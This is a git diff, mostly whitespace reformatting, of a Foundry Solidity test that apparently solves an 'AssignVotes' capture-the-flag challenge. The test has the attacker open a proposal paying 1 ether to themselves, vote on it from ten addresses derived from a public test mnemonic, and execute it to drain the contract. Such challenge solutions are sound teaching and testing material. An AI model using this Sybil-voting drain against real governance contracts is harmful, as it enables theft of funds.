@@ -7,19 +7,14 @@ import {DeployAssignVotesScript} from "@script/5_DeployAssignVotes.s.sol";
 import {AssignVotes} from "@main/AssignVotes.sol";
 
 interface CheatCodes {
-   function startPrank(address) external;
-   function addr(uint256) external returns (address);
-   function deriveKey(
-        string calldata mnemonic,
-        string calldata path,
-        uint32 index
-    ) external returns (uint256);
+    function startPrank(address) external;
+    function addr(uint256) external returns (address);
+    function deriveKey(string calldata mnemonic, string calldata path, uint32 index) external returns (uint256);
 }
 
 contract AssignVotesTest is Test, DeployAssignVotesScript {
-
     CheatCodes cheats = CheatCodes(HEVM_ADDRESS);
-    string  mnemonic ="test test test test test test test test test test test junk";
+    string mnemonic = "test test test test test test test test test test test junk";
     uint256 deployerPrivateKey = vm.deriveKey(mnemonic, "m/44'/60'/0'/0/", 1); //  address = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
 
     address deployer = vm.addr(deployerPrivateKey);
@@ -36,17 +31,17 @@ contract AssignVotesTest is Test, DeployAssignVotesScript {
     function test_isSolved() public {
         vm.startPrank(attacker);
 
-        assertEq( address(assignvotesChallenge).balance, 1 ether );
-        assertEq( address(attacker).balance, 0 );
+        assertEq(address(assignvotesChallenge).balance, 1 ether);
+        assertEq(address(attacker).balance, 0);
 
         uint256 voterPrivateKey;
         address voter;
         address[10] memory voters;
 
-        for(uint32 i = 0; i < 10;) {
+        for (uint32 i = 0; i < 10;) {
             voterPrivateKey = cheats.deriveKey(mnemonic, "m/44'/60'/0'/1/", i);
             voter = cheats.addr(voterPrivateKey);
-            voters[i]= voter;
+            voters[i] = voter;
             unchecked {
                 i++;
             }
@@ -54,9 +49,9 @@ contract AssignVotesTest is Test, DeployAssignVotesScript {
         uint256 length = voters.length;
         assignvotesChallenge.createProposal(attacker, new bytes(0), 1 ether);
 
-        vm.stopPrank(  );
+        vm.stopPrank();
 
-        for(uint32 j = 0; j < length;) {
+        for (uint32 j = 0; j < length;) {
             voterPrivateKey = cheats.deriveKey(mnemonic, "m/44'/60'/0'/1/", j);
             voter = cheats.addr(voterPrivateKey);
             cheats.startPrank(voter);
@@ -66,16 +61,15 @@ contract AssignVotesTest is Test, DeployAssignVotesScript {
             unchecked {
                 j++;
             }
-            vm.stopPrank(  );
+            vm.stopPrank();
         }
 
         vm.startPrank(attacker);
         assignvotesChallenge.execute(0);
 
-        assertEq( address(assignvotesChallenge).balance, 0 );
-        assertEq( address(attacker).balance, 1 ether );
+        assertEq(address(assignvotesChallenge).balance, 0);
+        assertEq(address(attacker).balance, 1 ether);
 
-        vm.stopPrank(  );
+        vm.stopPrank();
     }
-
 }
